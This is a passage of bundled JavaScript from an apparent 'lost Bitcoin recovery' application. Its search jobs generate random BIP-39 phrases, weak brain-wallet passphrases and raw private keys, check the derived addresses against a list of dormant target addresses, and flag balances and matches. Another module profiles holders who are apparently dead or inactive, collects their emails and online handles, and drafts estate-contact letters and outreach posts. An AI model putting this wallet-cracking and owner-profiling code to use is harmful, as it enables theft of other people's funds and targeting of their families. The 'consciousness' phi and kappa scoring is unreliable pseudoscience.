        if (job.strategy === "bip39-continuous" || job.strategy === "bip39-adaptive" || job.strategy === "master-key-sweep" || job.strategy === "arbitrary-exploration") {
          await this.executeContinuousJob(jobId);
          return;
        }
        const phrases = await this.getPhrasesForStrategy(job);
        const BATCH_SIZE = 10;
        for (let i = job.progress.lastBatchIndex; i < phrases.length; i += BATCH_SIZE) {
          job = await storage.getSearchJob(jobId);
          if (!job || job.status === "stopped") {
            await storage.appendJobLog(jobId, { message: "Search stopped by user", type: "info" });
            endTelemetrySession(jobId, { success: false });
            return;
          }
          const batch = phrases.slice(i, i + BATCH_SIZE);
          const results = await this.processBatch(batch, jobId);
          job = await storage.getSearchJob(jobId);
          const newTested = job.progress.tested + batch.length;
          const newHighPhi = job.progress.highPhiCount + results.highPhiCandidates;
          const elapsed = Date.now() - new Date(job.stats.startTime).getTime();
          const rate = Math.round(newTested / (elapsed / 1e3) * 10) / 10;
          await storage.updateSearchJob(jobId, {
            progress: {
              ...job.progress,
              tested: newTested,
              highPhiCount: newHighPhi,
              lastBatchIndex: i + BATCH_SIZE
            },
            stats: { rate }
          });
          const updatedJob = await storage.getSearchJob(jobId);
          await this.syncWorkflowProgress(jobId, updatedJob);
          await storage.appendJobLog(jobId, {
            message: `Batch complete: ${batch.length} phrases tested, ${results.highPhiCandidates} high-\u03A6`,
            type: "info"
          });
          if (results.matchFound) {
            const finalJob2 = await storage.getSearchJob(jobId);
            await storage.updateSearchJob(jobId, {
              status: "completed",
              progress: {
                ...finalJob2.progress,
                matchFound: true,
                matchedPhrase: results.matchedPhrase
              },
              stats: { endTime: (/* @__PURE__ */ new Date()).toISOString(), rate: finalJob2.stats.rate }
            });
            const completedJob = await storage.getSearchJob(jobId);
            await this.syncWorkflowProgress(jobId, completedJob);
            await storage.appendJobLog(jobId, {
              message: `\u{1F389} MATCH FOUND! ${results.matchedPhrase}`,
              type: "success"
            });
            endTelemetrySession(jobId, { success: true });
            return;
          }
          await new Promise((resolve) => setTimeout(resolve, 100));
        }
        const finalJob = await storage.getSearchJob(jobId);
        await storage.updateSearchJob(jobId, {
          status: "completed",
          stats: { endTime: (/* @__PURE__ */ new Date()).toISOString(), rate: finalJob.stats.rate }
        });
        await storage.appendJobLog(jobId, { message: "Search completed", type: "info" });
        endTelemetrySession(jobId, { success: true });
      }
      async executeContinuousJob(jobId) {
        const BATCH_SIZE = 10;
        let job = await storage.getSearchJob(jobId);
        const minHighPhi = job.params.minHighPhi || 2;
        const wordLength = job.params.wordLength || 24;
        const allLengths = wordLength === 0;
        const validLengths = [12, 15, 18, 21, 24];
        const generationMode = job.params.generationMode || "bip39";
        if (!this.discoveryTrackers.has(jobId)) {
          this.discoveryTrackers.set(jobId, new DiscoveryTracker());
          this.modeExplorationBatches.set(jobId, 0);
          this.modeInvestigationBatches.set(jobId, 0);
        }
        const tracker = this.discoveryTrackers.get(jobId);
        if (!job.progress.searchMode) {
          await storage.updateSearchJob(jobId, {
            progress: { ...job.progress, searchMode: "exploration" }
          });
          job = await storage.getSearchJob(jobId);
        }
        const lengthDesc = allLengths ? "all lengths (12-24 words)" : `${wordLength} words`;
        const modeDesc = generationMode === "master-key" ? "master private keys (256-bit)" : generationMode === "arbitrary" ? "arbitrary brain wallet passphrases (2009 era, no BIP-39 validation)" : `BIP-39 passphrases (${lengthDesc})`;
        await storage.appendJobLog(jobId, {
          message: `Continuous generation (${modeDesc}): running until ${minHighPhi}+ high-\u03A6 candidates found. Adaptive mode switching enabled.`,
          type: "info"
        });
        while (true) {
          job = await storage.getSearchJob(jobId);
          if (!job || job.status === "stopped") {
            await storage.appendJobLog(jobId, { message: "Search stopped by user", type: "info" });
            endTelemetrySession(jobId, { success: false });
            return;
          }
          const currentMode = job.progress.searchMode || "exploration";
          const recommendedMode = tracker.getRecommendedMode();
          let actualMode = currentMode;
          if (recommendedMode !== currentMode && tracker.getAllRates().batchCount >= 10) {
            actualMode = recommendedMode;
            await storage.updateSearchJob(jobId, {
              progress: { ...job.progress, searchMode: actualMode }
            });
            await storage.appendJobLog(jobId, {
              message: `\u{1F504} Mode switch: ${currentMode} \u2192 ${actualMode}`,
              type: "info"
            });
          }
          const batch = [];
          if (actualMode === "investigation" && job.progress.investigationTarget && generationMode !== "master-key" && generationMode !== "arbitrary") {
            const targetPhrase = job.progress.investigationTarget;
            const variations = generateLocalSearchVariations(targetPhrase, BATCH_SIZE * 2);
            for (let i = 0; i < Math.min(BATCH_SIZE, variations.length); i++) {
              batch.push({ value: variations[i], type: "bip39" });
            }
            this.modeInvestigationBatches.set(jobId, (this.modeInvestigationBatches.get(jobId) || 0) + 1);
          } else {
            for (let i = 0; i < BATCH_SIZE; i++) {
              if (generationMode === "master-key") {
                batch.push({ value: generateMasterPrivateKey(), type: "master-key" });
              } else if (generationMode === "arbitrary") {
                const commonWords = ["white", "tiger", "gary", "ocean", "bitcoin", "satoshi", "crypto", "password", "secret", "key", "wallet", "money", "hash", "coin", "digital"];
                const numbers = ["77", "17", "07", "1", "7", "17", "2009", "2010", "2008", "08", "09"];
                const wordCount = 2 + i % 4;
                const elements = [];
                for (let w = 0; w < wordCount; w++) {
                  if (w < wordCount - 1 || Math.random() < 0.7) {
                    elements.push(commonWords[Math.floor(Math.random() * commonWords.length)]);
                  } else {
                    elements.push(numbers[Math.floor(Math.random() * numbers.length)]);
                  }
                }
                const phrase = Math.random() < 0.5 ? elements.join(" ") : elements.join("");
                batch.push({ value: phrase, type: "arbitrary" });
              } else {
                if (allLengths) {
                  const length = validLengths[i % validLengths.length];
                  batch.push({ value: generateRandomBIP39Phrase(length), type: "bip39" });
                } else {
                  batch.push({ value: generateRandomBIP39Phrase(wordLength), type: "bip39" });
                }
              }
            }
            this.modeExplorationBatches.set(jobId, (this.modeExplorationBatches.get(jobId) || 0) + 1);
          }
          const sampleItem = batch[0];
          const samplePreview = sampleItem.type === "master-key" ? sampleItem.value.substring(0, 12) + "..." : sampleItem.value.substring(0, 40) + (sampleItem.value.length > 40 ? "..." : "");
          await storage.appendJobLog(jobId, {
            message: `\u25B8 Testing [${sampleItem.type}]: "${samplePreview}" (+${batch.length - 1} more)`,
            type: "info"
          });
          const results = await this.processBatchWithTypes(batch, jobId);
          tracker.recordBatch(results.highPhiCandidates);
          const rates = tracker.getAllRates();
          const consciousnessController = getSharedController();
          if (results.highestScore !== void 0) {
            const avgPhi = results.highestScore / 100;
            const estimatedKappa = avgPhi > 0.75 ? QIG_CONSTANTS.KAPPA_STAR + (avgPhi - 0.75) * 40 : avgPhi * QIG_CONSTANTS.KAPPA_STAR;
            consciousnessController.updateFromBatchStats({
              avgPhi,
              highPhiCount: results.highPhiCandidates,
              totalTested: job.progress.tested + batch.length,
              batchSize: batch.length,
              currentKappa: estimatedKappa
            });
          }
          job = await storage.getSearchJob(jobId);
          const newTested = job.progress.tested + batch.length;
          const newHighPhi = job.progress.highPhiCount + results.highPhiCandidates;
          const elapsed = Date.now() - new Date(job.stats.startTime).getTime();
          const rate = Math.round(newTested / (elapsed / 1e3) * 10) / 10;
          let investigationTarget = job.progress.investigationTarget;
          let lastHighPhiStep = job.progress.lastHighPhiStep;
          if (results.highPhiCandidates > 0 && results.highestCandidate) {
            investigationTarget = results.highestCandidate;
            lastHighPhiStep = newTested;
          }
          const totalBatches = (this.modeExplorationBatches.get(jobId) || 0) + (this.modeInvestigationBatches.get(jobId) || 0);
          const explorationRatio = totalBatches > 0 ? Math.round((this.modeExplorationBatches.get(jobId) || 0) / totalBatches * 100) / 100 : 1;
          await storage.updateSearchJob(jobId, {
            progress: {
              ...job.progress,
              tested: newTested,
              highPhiCount: newHighPhi,
              lastBatchIndex: 0,
              // Not applicable for continuous
              investigationTarget,
              lastHighPhiStep
            },
            stats: {
              rate,
              discoveryRateFast: rates.fast,
              discoveryRateMedium: rates.medium,
              discoveryRateSlow: rates.slow,
              explorationRatio
            }
          });
          const modeLabel = actualMode === "investigation" ? "\u{1F50D}" : "\u{1F310}";
          await storage.appendJobLog(jobId, {
            message: `${modeLabel} Batch complete (${actualMode}): ${batch.length} tested, ${results.highPhiCandidates} high-\u03A6 (total: ${newHighPhi})`,
            type: "info"
          });
          if (results.matchFound) {
            const finalJob = await storage.getSearchJob(jobId);
            await storage.updateSearchJob(jobId, {
              status: "completed",
              progress: {
                ...finalJob.progress,
                matchFound: true,
                matchedPhrase: results.matchedPhrase
              },
              stats: { endTime: (/* @__PURE__ */ new Date()).toISOString(), rate: finalJob.stats.rate }
            });
            const completedJob = await storage.getSearchJob(jobId);
            await this.syncWorkflowProgress(jobId, completedJob);
            await storage.appendJobLog(jobId, {
              message: `\u{1F389} MATCH FOUND! ${results.matchedPhrase}`,
              type: "success"
            });
            endTelemetrySession(jobId, { success: true });
            return;
          }
          if (newHighPhi >= minHighPhi) {
            const finalJob = await storage.getSearchJob(jobId);
            await storage.updateSearchJob(jobId, {
              status: "completed",
              stats: { endTime: (/* @__PURE__ */ new Date()).toISOString(), rate: finalJob.stats.rate }
            });
            await storage.appendJobLog(jobId, {
              message: `\u2713 Target reached: ${newHighPhi} high-\u03A6 candidates found`,
              type: "success"
            });
            endTelemetrySession(jobId, { success: true });
            return;
          }
          await new Promise((resolve) => setTimeout(resolve, 100));
        }
      }
      async getPhrasesForStrategy(job) {
        switch (job.strategy) {
          case "custom":
            return job.params.customPhrase ? [job.params.customPhrase] : [];
          case "batch":
            return job.params.batchPhrases || [];
          case "bip39-continuous":
          case "bip39-adaptive":
          case "master-key-sweep":
          case "arbitrary-exploration":
            return [];
          default:
            return [];
        }
      }
      async processBatch(phrases, jobId) {
        let highPhiCount = 0;
        const targetAddresses = await storage.getTargetAddresses();
        for (const phrase of phrases) {
          const words = phrase.trim().split(/\s+/);
          if (words.length !== 12) {
            continue;
          }
          const address = generateBitcoinAddress(phrase);
          const pureScore = scorePhraseQIG(phrase);
          queueAddressForBalanceCheck(phrase, "search-batch", pureScore.quality >= 0.75 ? 5 : 1);
          const matchedAddress = targetAddresses.find((t) => t.address === address);
          const isNearResonance = Math.abs(pureScore.kappa - 64) < 10;
          const derivedRegime = pureScore.phi > 0.75 ? "geometric" : pureScore.phi > 0.5 ? "linear" : "breakdown";
          const phi_spatial = pureScore.phi;
          const phi_temporal = 0;
          const phi_4D = phi_spatial;
          const inBlockUniverse = false;
          const dimensionalState = "3D";
          recordTelemetrySnapshot(jobId, {
            phi: pureScore.phi,
            kappa: pureScore.kappa,
            beta: pureScore.beta,
            regime: derivedRegime,
            quality: pureScore.quality,
            velocity: 0,
            inResonance: isNearResonance,
            basinDrift: 0,
            phi_spatial,
            phi_temporal,
            phi_4D,
            inBlockUniverse,
            dimensionalState
          });
          if (matchedAddress) {
            return {
              highPhiCandidates: highPhiCount,
              matchFound: true,
              matchedPhrase: phrase
            };
          }
          if (pureScore.quality >= 0.75) {
            const candidate = {
              id: randomUUID2(),
              phrase,
              address,
              score: pureScore.quality * 100,
              // Convert to 0-100 scale for consistency
              qigScore: {
                contextScore: 0,
                eleganceScore: 0,
                typingScore: 0,
                totalScore: pureScore.quality * 100
              },
              testedAt: (/* @__PURE__ */ new Date()).toISOString(),
              type: "bip39"
            };
            await storage.addCandidate(candidate);
            highPhiCount++;
          }
        }
        return {
          highPhiCandidates: highPhiCount,
          matchFound: false
        };
      }
      async processBatchWithTypes(items, jobId) {
        let highPhiCount = 0;
        let highestScore = 0;
        let highestCandidate;
        const targetAddresses = await storage.getTargetAddresses();
        for (const item of items) {
          let address;
          if (item.type === "master-key") {
            address = generateBitcoinAddressFromPrivateKey(item.value);
            queueAddressFromPrivateKey(item.value, item.value, "search-masterkey", 3);
          } else {
            address = generateBitcoinAddress(item.value);
            queueAddressForBalanceCheck(item.value, `search-${item.type}`, 3);
          }
          const matchedAddress = targetAddresses.find((t) => t.address === address);
          if (matchedAddress) {
            const universalScore2 = scoreUniversalQIG(item.value, item.type);
            const inBlockUniverse2 = universalScore2.phi_4D >= 0.85 && universalScore2.phi_temporal > 0.7;
            const dimensionalState2 = inBlockUniverse2 ? "4D-active" : universalScore2.phi_spatial > 0.85 && universalScore2.phi_temporal > 0.5 ? "4D-transitioning" : "3D";
            recordTelemetrySnapshot(jobId, {
              phi: universalScore2.phi,
              kappa: universalScore2.kappa,
              beta: universalScore2.beta,
              regime: universalScore2.regime,
              quality: universalScore2.quality,
              velocity: 0,
              inResonance: universalScore2.inResonance,
              basinDrift: 0,
              phi_spatial: universalScore2.phi_spatial,
              phi_temporal: universalScore2.phi_temporal,
              phi_4D: universalScore2.phi_4D,
              inBlockUniverse: inBlockUniverse2,
              dimensionalState: dimensionalState2
            });
            const matchCandidate = {
              id: randomUUID2(),
              phrase: item.value,
              address,
              score: 100,
              // Exact match = 100% score
              qigScore: {
                contextScore: Math.round(universalScore2.phi * 100),
                eleganceScore: Math.round((1 - Math.abs(universalScore2.kappa - 64) / 64) * 100),
                typingScore: Math.round(universalScore2.patternScore * 100),
                totalScore: Math.round(universalScore2.quality * 100)
              },
              testedAt: (/* @__PURE__ */ new Date()).toISOString(),
              type: item.type
            };
            await storage.addCandidate(matchCandidate);
            await storage.appendJobLog(jobId, {
              message: `\u{1F389} MATCH FOUND! Address: ${matchedAddress.address} | Type: ${item.type} | \u03A6=${universalScore2.phi.toFixed(3)} \u03BA=${universalScore2.kappa.toFixed(1)} regime=${universalScore2.regime}`,
              type: "success"
            });
            return {
              highPhiCandidates: highPhiCount,
              matchFound: true,
              matchedPhrase: item.value,
              highestCandidate,
              highestScore
            };
          }
          const universalScore = scoreUniversalQIG(item.value, item.type);
          const qualityPercent = universalScore.quality * 100;
          if (!this.velocityMonitors.has(jobId)) {
            this.velocityMonitors.set(jobId, new BasinVelocityMonitor());
            this.resonanceDetectors.set(jobId, new ResonanceDetector());
          }
          const velocity = this.velocityMonitors.get(jobId).update(item.value, Date.now());
          this.resonanceDetectors.get(jobId).checkResonance(universalScore.kappa);
          const inBlockUniverse = universalScore.phi_4D >= 0.85 && universalScore.phi_temporal > 0.7;
          const dimensionalState = inBlockUniverse ? "4D-active" : universalScore.phi_spatial > 0.85 && universalScore.phi_temporal > 0.5 ? "4D-transitioning" : "3D";
          recordTelemetrySnapshot(jobId, {
            phi: universalScore.phi,
            kappa: universalScore.kappa,
            beta: universalScore.beta,
            regime: universalScore.regime,
            quality: universalScore.quality,
            velocity: velocity.velocity,
            inResonance: universalScore.inResonance,
            basinDrift: velocity.velocity * 10,
            // Scale for visibility
            phi_spatial: universalScore.phi_spatial,
            phi_temporal: universalScore.phi_temporal,
            phi_4D: universalScore.phi_4D,
            inBlockUniverse,
            dimensionalState
          });
          if (qualityPercent > highestScore) {
            highestScore = qualityPercent;
            highestCandidate = item.value;
          }
          if (universalScore.quality >= 0.75) {
            const candidate = {
              id: randomUUID2(),
              phrase: item.value,
              address,
              score: qualityPercent,
              qigScore: {
                contextScore: Math.round(universalScore.phi * 100),
                eleganceScore: Math.round((1 - Math.abs(universalScore.kappa - 64) / 64) * 100),
                typingScore: Math.round(universalScore.patternScore * 100),
                totalScore: Math.round(qualityPercent)
              },
              testedAt: (/* @__PURE__ */ new Date()).toISOString(),
              type: item.type
            };
            await storage.addCandidate(candidate);
            highPhiCount++;
            const phrasePreview = item.type === "arbitrary" || item.type === "bip39" ? item.value.substring(0, 50) + (item.value.length > 50 ? "..." : "") : item.value.substring(0, 20) + "...";
            await storage.appendJobLog(jobId, {
              message: `\u{1F4CA} High-\u03A6 [${item.type}] "${phrasePreview}" | \u03A6=${universalScore.phi.toFixed(3)} \u03BA=${universalScore.kappa.toFixed(1)} \u03B2=${universalScore.beta.toFixed(3)} | regime=${universalScore.regime} quality=${qualityPercent.toFixed(1)}% | resonance=${universalScore.inResonance ? "\u26A1" : "-"} velocity=${velocity.isSafe ? "\u2713" : "\u26A0\uFE0F"}`,
              type: "info"
            });
          }
        }
        return {
          highPhiCandidates: highPhiCount,
          matchFound: false,
          highestCandidate: highPhiCount > 0 ? highestCandidate : void 0,
          highestScore: highPhiCount > 0 ? highestScore : void 0
        };
      }
      async stopJob(jobId) {
        const job = await storage.getSearchJob(jobId);
        if (job && (job.status === "pending" || job.status === "running")) {
          await storage.updateSearchJob(jobId, {
            status: "stopped",
            stats: { endTime: (/* @__PURE__ */ new Date()).toISOString(), rate: job.stats.rate }
          });
        }
      }
    };
    searchCoordinator = new SearchCoordinator();
  }
});

// server/vector-execution.ts
var vector_execution_exports = {};
__export(vector_execution_exports, {
  buildAddressTimeline: () => buildAddressTimeline,
  executeEstateResearch: () => executeEstateResearch,
  executeVector: () => executeVector,
  generateCommunityPost: () => generateCommunityPost,
  generateEstateContactLetter: () => generateEstateContactLetter,
  generateForumSearchQueries: () => generateForumSearchQueries,
  generateWaybackUrls: () => generateWaybackUrls,
  getRecommendedVectors: () => getRecommendedVectors,
  searchBitcoinTalk: () => searchBitcoinTalk,
  searchWaybackMachine: () => searchWaybackMachine
});
async function executeEstateResearch(workflow, _priority) {
  const recommendations = [];
  const entities2 = await observerStorage.getEntitiesByAddress(workflow.address);
  const artifacts2 = await observerStorage.getArtifactsByAddress(workflow.address);
  for (const entity of entities2) {
    if (entity.isDeceased) {
      recommendations.push(`Entity "${entity.name}" is marked as deceased. Check for estate contact.`);
      if (entity.estateContact) {
        recommendations.push(`Estate contact available: ${entity.estateContact}`);
      } else {
        recommendations.push(`No estate contact on file. Consider public records search.`);
      }
    }
    if (entity.emailAddresses && entity.emailAddresses.length > 0) {
      recommendations.push(`Email addresses available for "${entity.name}": ${entity.emailAddresses.join(", ")}`);
    }
    if (entity.lastActivityDate) {
      const yearsSinceActivity = (Date.now() - entity.lastActivityDate.getTime()) / (365 * 24 * 60 * 60 * 1e3);
      if (yearsSinceActivity > 10) {
        recommendations.push(`"${entity.name}" has been inactive for ${yearsSinceActivity.toFixed(1)} years. May be deceased or unreachable.`);
      }
    }
  }
  if (entities2.length === 0) {
    recommendations.push("No entities linked to this address. Consider:");
    recommendations.push("  - BitcoinTalk forum search for address mentions");
    recommendations.push("  - Cryptography mailing list archives");
    recommendations.push("  - GitHub/SourceForge early Bitcoin contributors");
    recommendations.push("  - Archive.org snapshots of early Bitcoin sites");
  }
  return { entities: entities2, artifacts: artifacts2, recommendations };
}
function generateEstateContactLetter(entity, address, estimatedValue) {
  const template = `
Dear ${entity.name || "Bitcoin Holder"} or Estate Representative,

I am reaching out regarding a dormant Bitcoin address that may be associated with you 
or your family:

Address: ${address}
Estimated Value: ${estimatedValue}

This address has been inactive since approximately ${entity.lastActivityDate?.toISOString().split("T")[0] || "2009-2011"}, 
a period during early Bitcoin development. Many addresses from this era contain 
significant value that the original holders may have forgotten or lost access to.

If this address belongs to you or someone you represent, we may be able to assist 
with recovery. Our organization specializes in:

1. Technical recovery assistance for lost passphrases
2. Legal guidance for estate Bitcoin claims
3. Secure handling of recovered assets

If you have any information about this address or the original holder, please respond 
to this letter. All communications are kept strictly confidential.

This is a legitimate recovery effort, not a scam. We recommend verifying our 
organization's credentials before providing any sensitive information.

Sincerely,
[Observer Archaeology System]
Recovery Reference: ${address.substring(0, 8)}...
  `.trim();
  return template;
}
function generateForumSearchQueries(address) {
  const shortAddr = address.substring(0, 10);
  return [
    `"${address}"`,
    // Exact address match
    `"${shortAddr}"`,
    // Partial address
    `address:${shortAddr}`,
    // Address prefix search
    `"lost coins" OR "lost wallet" ${shortAddr}`,
    `"2009" OR "2010" OR "2011" ${shortAddr}`,
    `"satoshi" OR "early bitcoin" ${shortAddr}`
  ];
}
async function searchBitcoinTalk(query) {
  console.log(`[SocialVector] BitcoinTalk search: ${query}`);
  return {
    results: [],
    total: 0
  };
}
function generateCommunityPost(address, context) {
  const post = `
**Lost Bitcoin Recovery Research - ${context.era} Era Address**

I'm researching a dormant Bitcoin address from the ${context.era} era:

\`${address}\`

**Known information:**
- Approximate value: ${context.balance}
- Era: ${context.era}
${context.constraints.map((c) => `- ${c}`).join("\n")}

If you or anyone you know may have information about this address or its original 
owner, please reach out. This is a legitimate recovery research effort.

Note: I am not asking for private keys or passphrases. I'm only trying to locate 
the original owner or their estate representatives.

*This post is part of the Observer Archaeology Project for recovering lost 
Bitcoin from the early era.*
  `.trim();
  return post;
}
function generateWaybackUrls(address) {
  return [
    `https://web.archive.org/web/*/blockchain.info/address/${address}`,
    `https://web.archive.org/web/*/blockexplorer.com/address/${address}`,
    `https://web.archive.org/web/*/bitcointalk.org/*${address}*`,
    `https://web.archive.org/web/*/sourceforge.net/projects/bitcoin/*${address}*`
  ];
}
async function searchWaybackMachine(url) {
  console.log(`[TemporalVector] Wayback search: ${url}`);
  return {
    snapshots: [],
    total: 0
  };
}
async function buildAddressTimeline(address) {
  const timeline = [];
  const addressData = await observerStorage.getAddress(address);
  if (addressData) {
    timeline.push({
      date: addressData.firstSeenTimestamp,
      event: `First seen on blockchain (block ${addressData.firstSeenHeight})`,
      source: "blockchain"
    });
    if (addressData.lastActivityTimestamp) {
      timeline.push({
        date: addressData.lastActivityTimestamp,
        event: `Last activity on blockchain (block ${addressData.lastActivityHeight})`,
        source: "blockchain"
      });
    }
  }
  const artifacts2 = await observerStorage.getArtifactsByAddress(address);
  for (const artifact of artifacts2) {
    if (artifact.timestamp) {
      timeline.push({
        date: artifact.timestamp,
        event: `${artifact.type}: "${artifact.title || "Untitled"}"`,
        source: artifact.source
      });
    }
  }
  timeline.sort((a, b) => a.date.getTime() - b.date.getTime());
  return timeline;
}
async function executeVector(workflow, priority, vector) {
  switch (vector) {
    case "estate":
      return executeEstateVector(workflow, priority);
    case "social":
      return executeSocialVector(workflow, priority);
    case "temporal":
      return executeTemporalVector(workflow, priority);
    case "constrained_search":
      return {
        vector: "constrained_search",
        status: "success",
        progress: 0,
        findings: ["Constrained search is executed by SearchCoordinator"],
        recommendations: ["Use /api/observer/workflows/:id/start-search to initiate"],
        nextSteps: [],
        data: null
      };
    default:
      throw new Error(`Unknown vector: ${vector}`);
  }
}
async function executeEstateVector(workflow, priority) {
  const { entities: entities2, artifacts: artifacts2, recommendations } = await executeEstateResearch(workflow, priority);
  const findings = [];
  const nextSteps = [];
  if (entities2.length > 0) {
    findings.push(`Found ${entities2.length} linked entities`);
    for (const entity of entities2) {
      if (entity.isDeceased) {
        findings.push(`Entity "${entity.name}" is deceased`);
        if (entity.estateContact) {
          nextSteps.push(`Contact estate: ${entity.estateContact}`);
        } else {
          nextSteps.push(`Research estate for "${entity.name}"`);
        }
      } else if (entity.emailAddresses?.length) {
        nextSteps.push(`Contact "${entity.name}" via email`);
      }
    }
  } else {
    findings.push("No entities linked to address");
    nextSteps.push("Perform social vector research to identify owner");
  }
  return {
    vector: "estate",
    status: entities2.length > 0 ? "success" : "partial",
    progress: entities2.length > 0 ? 50 : 10,
    findings,
    recommendations,
    nextSteps,
    data: { entities: entities2, artifacts: artifacts2 }
  };
}
async function executeSocialVector(workflow, _priority) {
  const findings = [];
  const recommendations = [];
  const nextSteps = [];
  const queries = generateForumSearchQueries(workflow.address);
  findings.push(`Generated ${queries.length} forum search queries`);
  for (const query of queries.slice(0, 3)) {
    const results = await searchBitcoinTalk(query);
    if (results.total > 0) {
      findings.push(`Found ${results.total} BitcoinTalk results for: ${query}`);
    }
  }
  const artifacts2 = await observerStorage.getArtifactsByAddress(workflow.address);
  const bitcoinTalkArtifacts = artifacts2.filter((a) => a.source === "bitcointalk");
  if (bitcoinTalkArtifacts.length > 0) {
    findings.push(`${bitcoinTalkArtifacts.length} BitcoinTalk artifacts already cataloged`);
    for (const artifact of bitcoinTalkArtifacts) {
      findings.push(`  - ${artifact.title || artifact.type}: ${artifact.author || "unknown author"}`);
    }
  }
  recommendations.push("Search BitcoinTalk forum for address mentions");
  recommendations.push("Check Reddit r/Bitcoin historical posts");
  recommendations.push("Search early Bitcoin Twitter archives");
  nextSteps.push("Execute all generated search queries");
  nextSteps.push("Cross-reference authors with entity database");
  nextSteps.push("Consider community outreach post if no direct contacts found");
  return {
    vector: "social",
    status: "partial",
    progress: 20,
    findings,
    recommendations,
    nextSteps,
    data: { queries, existingArtifacts: artifacts2.length }
  };
}
async function executeTemporalVector(workflow, _priority) {
  const findings = [];
  const recommendations = [];
  const nextSteps = [];
  const timeline = await buildAddressTimeline(workflow.address);
  findings.push(`Built timeline with ${timeline.length} events`);
  for (const event of timeline) {
    findings.push(`  ${event.date.toISOString().split("T")[0]}: ${event.event} (${event.source})`);
  }
  const waybackUrls = generateWaybackUrls(workflow.address);
  findings.push(`Generated ${waybackUrls.length} Wayback Machine search URLs`);
  for (const url of waybackUrls.slice(0, 2)) {
    const results = await searchWaybackMachine(url);
    if (results.total > 0) {
      findings.push(`Found ${results.total} archive snapshots at: ${url}`);
    }
  }
  recommendations.push("Search archive.org for early blockchain explorer snapshots");
  recommendations.push("Check Google Cache for recent mentions");
  recommendations.push("Search newspaper archives for early Bitcoin stories");
  nextSteps.push("Execute all Wayback Machine searches");
  nextSteps.push("Cross-reference timeline with known Bitcoin events");
  nextSteps.push("Look for forum posts matching activity dates");
  return {
    vector: "temporal",
    status: "partial",
    progress: 25,
    findings,
    recommendations,
    nextSteps,
    data: { timeline, waybackUrls }
  };
}
function getRecommendedVectors(priority) {
  const vectors = [];
  const constraints = priority.constraints;
  vectors.push("constrained_search");
  if (constraints?.entityLinkage > 0 || constraints?.hasEstateContact) {
    vectors.push("estate");
  }
  if (constraints?.artifactDensity > 0 || priority.tier === "high") {
    vectors.push("social");
  }
  const addressData = priority.constraints;
  if (addressData?.isEarlyEra || priority.address.startsWith("1")) {
    vectors.push("temporal");
  }
  return vectors;
}
var init_vector_execution = __esm({
  "server/vector-execution.ts"() {
    "use strict";
    init_observer_storage();
  }
});

// server/multi-substrate-integrator.ts
var multi_substrate_integrator_exports = {};
__export(multi_substrate_integrator_exports, {
  analyzeGeometricIntersection: () => analyzeGeometricIntersection,
  enrichWithSubstrateData: () => enrichWithSubstrateData,
  findHighPriorityTargets: () => findHighPriorityTargets,
  generateSubstrateReport: () => generateSubstrateReport
});
function getSubstrateWeight(type) {
  const weights = {
    blockchain: 1,
    // Most reliable - on-chain data
    bitcointalk: 0.8,
    // High - contemporary forum activity
    github: 0.7,
    // Good - developer activity
    sourceforge: 0.6,
    // Good - early code hosting
    cryptography_ml: 0.9,
    // High - early crypto discussions
    bitcoin_ml: 0.85,
    // High - Bitcoin-specific discussions
    temporal_archive: 0.5,
    // Medium - archived snapshots
    mt_gox: 0.6,
    // Medium - exchange records
    news: 0.3
    // Low - general news
  };
  return weights[type] || 0.5;
}
async function gatherBlockchainSignals(address) {
  const signals = [];
  try {
    const addressData = await observerStorage.getAddress(address);
    if (addressData) {
      signals.push({
        type: "blockchain",
        address,
        timestamp: addressData.firstSeenTimestamp,
        confidence: 1,
        // On-chain data is definitive
        geometricWeight: getSubstrateWeight("blockchain"),
        data: {
          balance: addressData.currentBalance.toString(),
          isDormant: addressData.isDormant,
          dormancyBlocks: addressData.dormancyBlocks,
          isEarlyEra: addressData.isEarlyEra,
          isCoinbase: addressData.isCoinbaseReward,
          temporalSignature: addressData.temporalSignature,
          valueSignature: addressData.valueSignature,
          scriptSignature: addressData.scriptSignature,
          graphSignature: addressData.graphSignature
        }
      });
    }
  } catch (error) {
    console.error(`[MultiSubstrate] Blockchain signal error for ${address}:`, error);
  }
  return signals;
}
async function gatherEntitySignals(address) {
  const signals = [];
  try {
    const entities2 = await observerStorage.getEntitiesByAddress(address);
    for (const entity of entities2) {
      if (entity.bitcoinTalkUsername) {
        signals.push({
          type: "bitcointalk",
          address,
          entity: entity.name,
          timestamp: entity.firstActivityDate || void 0,
          confidence: 0.85,
          geometricWeight: getSubstrateWeight("bitcointalk"),
          data: {
            username: entity.bitcoinTalkUsername,
            entityType: entity.type,
            aliases: entity.aliases
          }
        });
      }
      if (entity.githubUsername) {
        signals.push({
          type: "github",
          address,
          entity: entity.name,
          timestamp: entity.firstActivityDate || void 0,
          confidence: 0.75,
          geometricWeight: getSubstrateWeight("github"),
          data: {
            username: entity.githubUsername,
            entityType: entity.type
          }
        });
      }
      if (entity.emailAddresses && entity.emailAddresses.length > 0) {
        signals.push({
          type: "cryptography_ml",
          address,
          entity: entity.name,
          confidence: 0.6,
          geometricWeight: getSubstrateWeight("cryptography_ml"),
          data: {
            emails: entity.emailAddresses
          }
        });
      }
    }
  } catch (error) {
    console.error(`[MultiSubstrate] Entity signal error for ${address}:`, error);
  }
  return signals;
}
async function gatherArtifactSignals(address) {
  const signals = [];
  try {
    const artifacts2 = await observerStorage.getArtifactsByAddress(address);
    for (const artifact of artifacts2) {
      const type = artifact.source;
      signals.push({
        type: type || "news",
        address,
        timestamp: artifact.timestamp || void 0,
        confidence: artifact.source === "bitcointalk" ? 0.8 : 0.5,
        geometricWeight: getSubstrateWeight(type || "news"),
        data: {
          title: artifact.title,
          author: artifact.author,
          url: artifact.url,
          artifactType: artifact.type
        }
      });
    }
  } catch (error) {
    console.error(`[MultiSubstrate] Artifact signal error for ${address}:`, error);
  }
  return signals;
}
function computeTemporalCoherence(signals) {
  const timestamps = signals.filter((s) => s.timestamp).map((s) => s.timestamp.getTime());
  if (timestamps.length < 2) return 0.5;
  const mean = timestamps.reduce((a, b) => a + b, 0) / timestamps.length;
  const variance = timestamps.reduce((sum, t) => sum + (t - mean) ** 2, 0) / timestamps.length;
  const stdDev = Math.sqrt(variance);
  const oneYear = 365 * 24 * 60 * 60 * 1e3;
  const coherence = Math.max(0, 1 - stdDev / oneYear);
  return coherence;
}
function computeIntersectionStrength(signals) {
  if (signals.length === 0) return 0;
  let totalWeight = 0;
  let weightedSum = 0;
  for (const signal of signals) {
    const w = signal.geometricWeight;
    weightedSum += signal.confidence * w;
    totalWeight += w;
  }
  const baseStrength = totalWeight > 0 ? weightedSum / totalWeight : 0;
